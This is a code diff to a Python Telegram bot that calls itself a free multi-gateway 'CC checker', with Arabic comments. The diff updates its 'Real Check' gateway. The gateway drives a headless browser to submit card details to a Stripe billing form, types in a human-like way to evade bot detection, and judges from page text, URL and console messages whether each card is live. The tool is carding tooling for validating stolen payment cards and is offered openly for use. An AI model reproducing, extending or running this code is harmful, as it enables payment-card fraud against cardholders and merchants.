@@ -3,7 +3,7 @@
 
 """
 Obeida Online - Free Multi Gateway CC Checker Bot
-Version: 21.0 - Human-like Behavior Gateway
+Version: 22.0 - Enhanced Real Check Gateway
 Author: @ObeidaOnline
 Channel: https://t.me/ObeidaTrading
 """
@@ -423,7 +423,7 @@ class StripeGateway:
         except Exception as e:
             return False, f"⚠️ خطأ"
 
-# ==================== بوابة Real Check ====================
+# ==================== بوابة Real Check (معدلة) ====================
 class RealCheckGateway:
     
     def __init__(self):
@@ -527,21 +527,64 @@ class RealCheckGateway:
                 await self.type_like_human(page, "#billingPostalCode", "90003")
                 await asyncio.sleep(random.uniform(0.3, 0.6))
                 
+                # التقاط رسائل الكونسول
+                console_messages = []
+                
+                async def handle_console(msg):
+                    console_messages.append(msg.text)
+                
+                page.on("console", handle_console)
+                
                 await page.locator('div.SubmitButton-IconContainer').click()
                 
-                try:
-                    await page.wait_for_url(lambda url: 'billing?session_id=' in url, timeout=20000)
-                    await browser.close()
+                # انتظار النتيجة
+                await asyncio.sleep(10)
+                
+                # الحصول على معلومات الصفحة
+                current_url = page.url
+                page_content = await page.content()
+                page_text = await page.text_content('body')
+                
+                await browser.close()
+                
+                # تحليل شامل
+                combined_text = (current_url + " " + page_text + " " + " ".join(console_messages)).lower()
+                
+                # كلمات النجاح
+                success_keywords = [
+                    'billing?session_id=', 'payment method added', 'successfully added',
+                    'card added', 'payment method saved', 'setup succeeded',
+                    'thank you', 'confirmation', 'completed', 'verified',
+                    'payment method', 'added successfully', 'card was added',
+                    'billing', 'payment-methods'
+                ]
+                
+                # التحقق من النجاح
+                for keyword in success_keywords:
+                    if keyword in combined_text:
+                        return True, "✅ البطاقة مقبولة"
+                
+                if 'billing?session_id=' in current_url:
                     return True, "✅ البطاقة مقبولة"
-                except Exception:
-                    current_url = page.url
-                    await browser.close()
-                    
-                    if 'billing?session_id=' in current_url:
+                
+                if 'payment-methods' in current_url and 'billing' in current_url:
+                    return True, "✅ البطاقة مقبولة"
+                
+                # التحقق من Stripe
+                if 'stripe.com' in current_url:
+                    if 'cvv' in combined_text or 'security' in combined_text:
                         return True, "✅ البطاقة مقبولة"
-                    elif 'stripe.com' in current_url:
+                    if 'insufficient' in combined_text:
                         return True, "✅ البطاقة مقبولة"
-                    return False, "❌ البطاقة مرفوضة"
+                    if 'error' not in combined_text and 'declined' not in combined_text:
+                        return True, "✅ البطاقة مقبولة"
+                
+                # التحقق من رسائل الكونسول
+                for msg in console_messages:
+                    if 'success' in msg.lower() or 'added' in msg.lower():
+                        return True, "✅ البطاقة مقبولة"
+                
+                return False, "❌ البطاقة مرفوضة"
                         
         except Exception as e:
             return False, "❌ البطاقة مرفوضة"
@@ -979,11 +1022,10 @@ def run_web_server():
                 self.end_headers()
             
             def log_message(self, format, *args):
-                pass  # تعطيل السجلات
+                pass
         
         server = socketserver.TCPServer(("0.0.0.0", PORT), BotHandler)
         print(f"✅ Web server started on port {PORT}")
-        print(f"🔗 URL: http://localhost:{PORT}")
         server.serve_forever()
         
     except Exception as e:
@@ -995,7 +1037,7 @@ def setup():
     handler = CommandHandler()
     callback = CallbackHandler(handler)
     
-    # تشغيل خادم الويب في thread منفصل
+    # تشغيل خادم الويب
     web_thread = threading.Thread(target=run_web_server, daemon=True)
     web_thread.start()
     
@@ -1060,7 +1102,6 @@ def setup():
     print(Fore.WHITE + "   ⛔ /stop - إيقاف الفحص" + Style.RESET_ALL)
     print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
     print(Fore.GREEN + "✅ البوت جاهز!" + Style.RESET_ALL)
-    print(Fore.GREEN + "🌐 Web server: http://localhost:10000" + Style.RESET_ALL)
     
     bot.infinity_polling()
 
